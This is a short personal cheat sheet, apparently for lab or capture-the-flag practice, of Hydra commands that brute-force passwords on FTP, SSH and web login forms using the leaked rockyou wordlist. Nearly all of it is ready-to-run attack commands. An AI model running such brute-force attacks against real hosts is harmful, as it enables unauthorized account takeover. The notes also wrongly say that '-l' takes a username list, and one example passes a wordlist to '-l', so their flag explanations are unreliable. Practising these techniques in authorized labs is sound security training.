# Notes and example commands in hydra

[Hydra docs from kali](https://en.kali.tools/?p=220)

## FTP cracking

- `hydra -l <userlist> -P <passlist> ftp://<ip>`
  - `-l` is for login. For selecting creds for username field. Could pass path to a list of usernames.
  - `-P` is for password. For selecting creds for password field. could pass path to a list of passwords.

## SSH cracking

- `hydra -l <userlist> -P <passlist> <ip> -t <numberOfThreads> ssh`
  - `-l` for login/username
  - `-P` for password
  - `-t` for specifying number of threads to be used
  - `ssh` for specifying crack type

**Examples:**

- `hydra -l molly -P /Passwords/Leaked-Databases/rockyou.txt $(cat ip) ssh -V`

## POST login form

- `hydra -l <username> -P <wordlist> <ip> http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`
  - `-l` for login/username
  - `-P` for password
  - `http-post-form` for form type
  - `username=^USER^` usernames from wordlist will be replaced by `^USER^`
  - `password=^PASS^` passwords from wordlist will be replaced by `^PASS^`
  - `F=incorrect` if `incorrect` appears in the output, it's a failed login attempt.

**Examples:**

- `hydra -l /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt $(cat ip) http-post-form "/login:username=^USER^&password=^PASS^:F=invalid" -V`

## Wordlist locations to copy

`/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt`

## FTP hacking

- `hydra -l chris -P ../../wordlists/rockyou.txt ftp://$(cat ip) -V`
